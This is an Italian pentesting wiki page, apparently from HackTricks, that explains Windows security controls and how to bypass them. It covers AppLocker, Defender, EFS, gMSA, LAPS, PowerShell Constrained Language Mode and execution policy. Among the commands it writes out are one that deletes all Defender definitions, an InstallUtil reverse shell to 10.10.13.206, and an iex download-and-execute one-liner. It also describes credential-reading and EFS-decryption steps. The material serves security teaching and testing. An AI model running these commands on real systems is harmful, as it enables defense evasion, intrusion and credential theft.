# Controlli di sicurezza di Windows

{{#include ../banners/hacktricks-training.md}}

## Criteri di AppLocker

Una whitelist di applicazioni è un elenco di applicazioni software o eseguibili approvati che possono essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannoso e software non approvato che non soddisfa le esigenze specifiche dell'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di application whitelisting** di Microsoft e consente agli amministratori di sistema di controllare **quali applicazioni e file possono essere eseguiti dagli utenti**. Offre un **controllo granulare** su eseguibili, script, file di Windows Installer, DLL, app pacchettizzate e programmi di installazione di app pacchettizzate.\
È comune che le organizzazioni **blocchino cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto questo può essere aggirato**.

### Verifica

Verifica quali file/estensioni sono in blacklist/whitelist:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` valuta i file candidati per un'identità specifica in base a una policy AppLocker. Verifica l'account il cui token eseguirà il payload, perché le regole possono essere applicate a utenti o gruppi; anche `Get-AppLockerFileInformation` è utile per esaminare il percorso, l'hash e i metadati dell'editore a cui le regole potrebbero corrispondere.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Prima di considerare un test negato come un blocco effettivo, controlla la **modalità di applicazione effettiva di quella raccolta di regole** e il servizio Application Identity. `AuditOnly` valuta le regole, ma consente comunque l’esecuzione, mentre `NotConfigured` non equivale a disabilitato quando la raccolta contiene regole.<sup>[[7]](#references)</sup> Se `AppIDSvc` è arrestato, AppLocker non applica le regole.<sup>[[9]](#references)</sup> Questi controlli permettono di distinguere un bypass effettivo da un criterio che non ha mai bloccato il file.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Per un test di esecuzione controllato, confronta il registro eventi di AppLocker: **8003/8006** indicano che l’EXE/DLL o lo script/MSI sarebbe stato bloccato in modalità audit; **8004/8007** indicano che è stato effettivamente bloccato. Esegui il test con lo stesso tipo di file e la stessa identità previsti dal percorso di esecuzione.<sup>[[8]](#references)</sup>

Questo percorso del registro contiene le configurazioni e i criteri applicati da AppLocker e consente di esaminare l’insieme corrente di regole applicate nel sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Cartelle scrivibili** utili per bypassare i criteri di AppLocker: se AppLocker consente di eseguire qualsiasi cosa in `C:\Windows\System32` o `C:\Windows`, ci sono **cartelle scrivibili** che puoi usare per **bypassarlo**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- I binari comunemente **considerati attendibili** [**"LOLBAS's"**](https://lolbas-project.github.io/) possono essere utili anche per bypassare AppLocker.
- **Le regole scritte male possono essere bypassate**
  - Ad esempio, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e sarà consentita.
  - Le organizzazioni spesso si concentrano anche sul **bloccare l'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano gli **altri** [**percorsi degli eseguibili PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **L'applicazione delle regole sulle DLL è abilitata molto raramente**, a causa del carico aggiuntivo che può comportare per un sistema e dei test necessari per assicurarsi che nulla si interrompa. Quindi, usare **DLL come backdoor aiuta a bypassare AppLocker**.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per ulteriori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Archiviazione delle credenziali

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file e le password sono sottoposte a hashing.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (sottoposte a hashing) vengono **salvate** nella **memoria** di questo sottosistema per consentire il Single Sign-On.\
**LSA** amministra la **policy di sicurezza** locale (policy delle password, autorizzazioni degli utenti...), l'**autenticazione**, i **token di accesso**...\
LSA **controlla** le credenziali fornite nel file **SAM** (per un accesso locale) e **comunica** con il **domain controller** per autenticare un utente di dominio.

Le **credenziali** vengono **salvate** nel **processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decrittabili.

### LSA secrets

LSA può salvare alcune credenziali sul disco:

- Password dell'account computer di Active Directory (domain controller non raggiungibile).
- Password degli account dei servizi Windows
- Password delle attività pianificate
- Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database di Active Directory. È presente solo nei Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un antivirus disponibile in Windows 10 e Windows 11 e in alcune versioni di Windows Server. **Blocca** i comuni strumenti di pentesting, come **`WinPEAS`**. Tuttavia, esistono modi per **bypassare queste protezioni**.

### Verifica

Per verificare lo **stato** di **Defender**, puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per elencarlo, puoi anche eseguire:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## File system crittografato (EFS)

EFS protegge i file tramite crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave viene crittografata con la **chiave pubblica** dell'utente e memorizzata nei metadati NTFS `$EFS` del file (`$LOGGED_UTILITY_STREAM`), **non** in un normale flusso di dati alternativo `$DATA`.<sup>[[10]](#references)</sup> Quando è necessario decrittografare il file, la **chiave privata** corrispondente del certificato digitale dell'utente sblocca la FEK. Un agente di recupero dati (DRA) configurato dispone di una copia separata e crittografata della FEK nel campo di recupero dati.<sup>[[13]](#references)</sup>

**Gli scenari di decrittografia senza intervento dell'utente** includono:

- Quando file o cartelle vengono spostati su un file system che non supporta EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono decrittografati automaticamente.
- I file crittografati inviati in rete tramite il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente al proprietario di accedere **in modo trasparente** ai file crittografati. Tuttavia, cambiare semplicemente la password del proprietario e accedere non consentirà di decrittografarli.

**Punti chiave**:

- EFS utilizza una FEK simmetrica, crittografata con la chiave pubblica dell'utente.
- La decrittografia utilizza la chiave privata dell'utente per accedere alla FEK.
- La decrittografia automatica avviene in condizioni specifiche, ad esempio quando si copiano file su FAT32 o durante la trasmissione in rete.
- Il proprietario può accedere ai file crittografati senza ulteriori passaggi.

### Verificare le informazioni EFS

Non dedurre l'uso di EFS dalla presenza di `%APPDATA%\Microsoft\Protect`: contiene le chiavi master DPAPI usate da molte funzionalità di Windows.<sup>[[19]](#references)</sup> Ispeziona invece un file crittografato con `cipher /c "C:\path\file"` per elencare i certificati dell'utente e di recupero. `cipher /e` e `cipher /d` crittografano e decrittografano i file per un'entità che dispone della chiave privata corrispondente.<sup>[[11]](#references)</sup>

### Decrittografare i file EFS

Se `cipher /c` elenca un certificato di recupero e hai la **chiave privata DRA corrispondente** in un file PFX, importa il file PFX nell'archivio certificati dell'utente corrente, quindi decrittografa il file.<sup>[[11]](#references)[[12]](#references)</sup> Un certificato DRA appena generato non può decrittografare file meno recenti: la relativa chiave pubblica deve essere già stata inclusa quando il file è stato crittografato. L'accesso tramite ACL NTFS o il semplice reset della password dell'account non forniscono la chiave privata necessaria.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Essere l'autorità SYSTEM

Questo approccio richiede che l'**utente vittima** stia **eseguendo** un **processo** sull'host. In tal caso, da una sessione `meterpreter` puoi impersonare il token del processo dell'utente (`impersonate_token` di `incognito`). In alternativa, puoi eseguire `migrate` nel processo dell'utente.

#### Conoscere la password dell'utente

Mimikatz può importare il certificato e la chiave privata dell'utente, quindi usarli per decrittare i file protetti da EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Account di servizio gestiti di gruppo (gMSA)

Microsoft ha sviluppato gli **account di servizio gestiti di gruppo (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali, che spesso hanno l'impostazione "**Password never expire**" abilitata, i gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: i gMSA utilizzano una password complessa di 240 byte, che normalmente viene aggiornata ogni 30 giorni. I controller di dominio la derivano usando il materiale della chiave KDS, eliminando la necessità di aggiornamenti manuali della password.<sup>[[16]](#references)[[20]](#references)</sup>
- **Sicurezza avanzata**: questi account sono immuni ai blocchi e non possono essere utilizzati per gli accessi interattivi, aumentando così la sicurezza.
- **Supporto per più host**: i gMSA possono essere condivisi tra più host, il che li rende ideali per i servizi eseguiti su più server.
- **Supporto per le attività pianificate**: a differenza degli account di servizio gestiti, i gMSA supportano l'esecuzione di attività pianificate.
- **Gestione semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando cambiano i dettagli sAMaccount del computer o il nome DNS, semplificando la gestione degli SPN.

Un controller di dominio costruisce l'attributo LDAP _**msDS-ManagedPassword**_ al momento della lettura, usando il materiale della password derivato da KDS; il valore non è una password memorizzata in modo indipendente. Normalmente cambia ogni 30 giorni.<sup>[[20]](#references)</sup> Il [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) restituito **non è una password crittografata**: il campo `CurrentPassword` contiene la password in chiaro.<sup>[[14]](#references)</sup> L'accesso viene verificato rispetto a `msDS-GroupMSAMembership`, quindi rientra nell'ambito qualsiasi principal a cui siano stati concessi i diritti di recupero, non solo gli amministratori o gli host del servizio.<sup>[[15]](#references)</sup> La connessione LDAP deve garantire la riservatezza, ad esempio tramite LDAPS o SASL sealing.<sup>[[20]](#references)</sup>

Per la derivazione offline della password dopo l'esposizione della chiave radice KDS, consulta [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Puoi leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Trova maggiori informazioni in questo post**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Inoltre, consulta questa [pagina web](https://cube0x0.github.io/Relaying-for-gMSA/) per sapere come eseguire un **attacco NTLM relay** per **leggere** la **password** di **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Durante l'enumerazione, distingui **Microsoft LAPS legacy** dall'implementazione nativa di **Windows LAPS**. Windows LAPS è stato distribuito con gli aggiornamenti di Windows dell'11 aprile 2023 e può eseguire il backup della password di un amministratore locale gestito in **Windows Server Active Directory** o **Microsoft Entra ID**. Nelle distribuzioni basate su AD può anche crittografare le password, conservare la cronologia delle password crittografate e gestire la password DSRM di un controller di dominio. Il pacchetto MSI legacy scaricabile è deprecato nelle versioni più recenti di Windows, anche se Windows LAPS può funzionare in modalità di emulazione legacy.<sup>[[6]](#references)</sup>

Poiché Microsoft LAPS legacy e Windows LAPS sono implementazioni separate, identifica quale delle due è distribuita prima di applicare attacchi specifici per attributi o cmdlet. La pagina collegata illustra l'individuazione, l'enumerazione degli ACL, il recupero, la manipolazione della scadenza e il ripristino offline, senza ripetere qui queste procedure.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## Modalità PowerShell a linguaggio vincolato

La [**Modalità a linguaggio vincolato**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) di PowerShell **limita molte delle funzionalità** necessarie per usare PowerShell in modo efficace, ad esempio bloccando gli oggetti COM, consentendo solo tipi .NET approvati, i flussi di lavoro basati su XAML, le classi PowerShell e altro ancora.

### **Verifica**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` era un downgrade legacy, utilizzabile solo sugli host con il motore PowerShell 2 opzionale installato. Non è più incluso nelle versioni aggiornate di Windows 11 24H2 o Windows Server 2025; non considerarlo un bypass CLM attuale.<sup>[[17]](#references)</sup> Con il controllo delle applicazioni, PowerShell esegue il codice non attendibile in Constrained Language, mentre gli script considerati attendibili dai criteri possono essere eseguiti in Full Language.<sup>[[18]](#references)</sup>

Per configurazioni meno recenti, puoi usare [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potrebbe essere necessario** **_Aggiungi un riferimento_** -> _Sfoglia_ ->_Sfoglia_ -> aggiungere `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **modificare il progetto in .Net4.5**.

#### Bypass diretto:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità vincolata. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Criteri di esecuzione di PS

Per impostazione predefinita, è impostato su **restricted**. I principali modi per bypassare questo criterio sono:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Altre informazioni sono disponibili [qui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

È l'API che può essere usata per autenticare gli utenti.

SSPI si occupa di individuare il protocollo adeguato per due macchine che vogliono comunicare. Il metodo preferito è Kerberos. SSPI negozia quindi quale protocollo di autenticazione verrà usato. Questi protocolli di autenticazione, chiamati Security Support Provider (SSP), si trovano in ogni macchina Windows sotto forma di DLL ed entrambe le macchine devono supportare lo stesso protocollo per poter comunicare.

### Principali SSP

- **Kerberos**: quello preferito
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: per motivi di compatibilità
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: server web e LDAP, password sotto forma di hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: usato per negoziare il protocollo da usare (Kerberos o NTLM; Kerberos è quello predefinito)
  - %windir%\Windows\System32\lsasrv.dll

#### La negoziazione può offrire diversi metodi oppure uno solo.

## UAC - Controllo dell'account utente

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che consente di **richiedere il consenso per le attività con privilegi elevati**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Aggirare AppLocker e la modalità linguaggio vincolato di PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [come decrittare i file EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying per gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 modi per aggirare la Execution Policy di PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Usare i cmdlet di Windows PowerShell per AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Panoramica di Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Gestire le regole di AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Usare Visualizzatore eventi con AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Processi e interazioni di AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Flussi di file (file system locali)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Comando Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Comando Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Eseguire il backup della chiave privata EFS dell'agente di ripristino](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Attributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Proteggere gli account di servizio gestiti di gruppo](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Funzionalità rimosse da Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Usare App Control per proteggere PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Evento 4693 e chiavi master DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Struttura di msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
